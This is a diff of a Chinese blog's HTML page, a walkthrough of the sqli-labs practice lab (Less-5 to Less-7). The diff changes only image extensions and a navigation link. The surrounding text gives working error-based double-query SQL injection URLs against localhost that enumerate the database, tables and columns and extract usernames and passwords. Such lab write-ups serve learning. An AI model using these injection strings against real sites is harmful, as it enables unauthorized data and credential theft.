@@ -279,8 +279,8 @@
 <li><p><code>count()</code>：汇总函数</p>
 </li>
 <li><p><code>group by</code>：分组语句</p>
-<p>双查询注入原理我觉得<a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">这篇</a>写的特别好了，但这篇文章评论区问到count()函数为什么是必要的，我不是太理解他的解释。我发现如果没有count()函数，那么返回的结果是这样的：<img   class="lazyload" data-original="/2020/11/09/sqlilabs/16.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>说明，在第三步将a语句的结果插入到虚拟表中时，即使主键冲突，它也会自动合并，而不会报错，即只有group by时，将a结果插入到虚拟表后会再对比合并。但有了count()函数后，当a在第二次查询时，要再次插入新的a语句结果时，已经为其分配了count值，那么这时合并就会发生错误，因为count本身就是记录不同的key值的，无法合并<img   class="lazyload" data-original="/2020/11/09/sqlilabs/17.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>双查询注入原理我觉得<a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">这篇</a>写的特别好了，但这篇文章评论区问到count()函数为什么是必要的，我不是太理解他的解释。我发现如果没有count()函数，那么返回的结果是这样的：<img   class="lazyload" data-original="/2020/11/09/sqlilabs/16.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>说明，在第三步将a语句的结果插入到虚拟表中时，即使主键冲突，它也会自动合并，而不会报错，即只有group by时，将a结果插入到虚拟表后会再对比合并。但有了count()函数后，当a在第二次查询时，要再次插入新的a语句结果时，已经为其分配了count值，那么这时合并就会发生错误，因为count本身就是记录不同的key值的，无法合并<img   class="lazyload" data-original="/2020/11/09/sqlilabs/17.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>以上都是本人的观点，不一定正确，因为没有百度到更具体的原因，在此仅作为个人学习记录。</p>
 </li>
 </ol>
@@ -289,29 +289,29 @@
 <li>查询数据库：</li>
 </ol>
 <p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
-<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/15.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/15.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <ol start="2">
 <li>查询表名</li>
 </ol>
 <p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code>0</p>
-<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/18.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/18.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>这里只能返回一列，因此通过改变<code>Limit 0,1</code>来遍历</p>
 <p><code>limit</code>用法：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from tableName limit i,n</span><br><span class="line"># tableName：表名</span><br><span class="line"># i：为查询结果的索引值(默认从0开始)，当i&#x3D;0时可省略i</span><br><span class="line"># n：为查询结果返回的数量</span><br><span class="line"># i与n之间使用英文逗号&quot;,&quot;隔开</span><br></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/19.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/19.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <ol start="3">
 <li>查询列名：</li>
 </ol>
 <p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 8,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
-<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/20.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/21.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/20.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/21.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>得到username和password</p>
 <ol start="4">
 <li>最后一个个遍历username和password即可：</li>
 </ol>
 <p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
-<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/22.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/22.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6:"></a>less-6:</h3><p>其他都和less-5一样，但less-6使用双引号闭合字符串</p>
 <h2 id="Dump-into-outfile"><a href="#Dump-into-outfile" class="headerlink" title="Dump into outfile"></a>Dump into outfile</h2><h3 id="less-7："><a href="#less-7：" class="headerlink" title="less-7："></a>less-7：</h3><p>看标题就知道，在做题前需要了解一些函数</p>
 <table>
@@ -377,7 +377,7 @@
         
 <nav class="nav">
   
-    <a href="/2020/12/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="iconfont iconleft"></i>文件包含</a>
+    <a href="/2020/11/18/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"><i class="iconfont iconleft"></i>mysql基础命令使用</a>
   
   
     <a href="/2020/11/05/web%E6%96%B0%E6%89%8B/">攻防世界 web新手区<i class="iconfont iconright"></i></a>
